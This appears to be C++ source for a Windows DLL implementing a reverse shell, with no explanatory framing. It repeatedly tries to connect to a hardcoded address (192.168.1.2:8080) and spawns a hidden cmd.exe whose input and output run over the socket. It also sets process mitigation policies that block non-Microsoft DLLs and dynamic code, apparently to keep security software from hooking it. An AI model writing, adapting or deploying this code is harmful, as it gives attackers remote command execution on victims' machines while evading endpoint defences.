#ifdef DLLSHELLSIMPLE_EXPORTS
#define DLLSHELLSIMPLEAPI __declspec(dllexport)
#else
#define DLLSHELLSIMPLEAPI __declspec(dllimport)
#endif

#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
constexpr auto default_buffer_length = 1024;

// ReSharper disable once CppParameterMayBeConst
void Shell(wchar_t* ip, int port)
{
    while (true) {
        Sleep(5000);

        WSADATA version;
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0)
        {
            continue;
        }

        SOCKET my_socket;
        if ((my_socket = WSASocketW(
            AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, static_cast<unsigned>(NULL), static_cast<unsigned>(NULL))) == INVALID_SOCKET)
        {
            WSACleanup();
            continue;
        }

        sockaddr_in address{};
        address.sin_family = AF_INET;
        InetPton(AF_INET, ip, &address.sin_addr.s_addr);
        address.sin_port = htons(port);  // NOLINT(clang-diagnostic-implicit-int-conversion)

        if (WSAConnect(my_socket, reinterpret_cast<SOCKADDR*>(&address), sizeof(address), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
            closesocket(my_socket);
            WSACleanup();
            continue;
        }

        char receive_data[default_buffer_length];
        memset(receive_data, 0, sizeof(receive_data));
        auto receive_code = recv(my_socket, receive_data, default_buffer_length, 0);
        if (receive_code <= 0) {
            closesocket(my_socket);
            WSACleanup();
            continue;
        }

        STARTUPINFOEXA si;
        ZeroMemory(&si, sizeof(si));
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        si.StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | EXTENDED_STARTUPINFO_PRESENT);
        si.StartupInfo.hStdInput = si.StartupInfo.hStdOutput = si.StartupInfo.hStdError = reinterpret_cast<HANDLE>(my_socket);
        si.StartupInfo.wShowWindow = SW_HIDE;

        SIZE_T size = 0;
        InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
        si.lpAttributeList = static_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(
            GetProcessHeap(),
            0,
            size
        ));

        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        UpdateProcThreadAttribute(
            si.lpAttributeList, 
            0, 
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, 
            &policy, 
            sizeof(policy), 
            nullptr, 
            nullptr
        );

        PROCESS_INFORMATION pi;
        DWORD exit_code = 0;
        // ReSharper disable once CppFunctionalStyleCast
        CreateProcessA(
            nullptr, 
            LPSTR(R"(C:\Windows\System32\cmd.exe)"), 
            nullptr, 
            nullptr, 
            TRUE, 
            0, 
            nullptr, 
            nullptr, 
            reinterpret_cast<LPSTARTUPINFOA>(&si), 
            &pi
        );

        WaitForSingleObject(pi.hProcess, INFINITE);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        closesocket(my_socket);
        WSACleanup();
        break;
    }
}


extern "C" DLLSHELLSIMPLEAPI int main()
{
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
    ZeroMemory(&policy, sizeof(policy));
    policy.ProhibitDynamicCode = 1;
    if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy)) == false) {
        return 1;
    }

    wchar_t ip[12] = L"192.168.1.2";
    int port = 8080;
    Shell(ip, port);
}
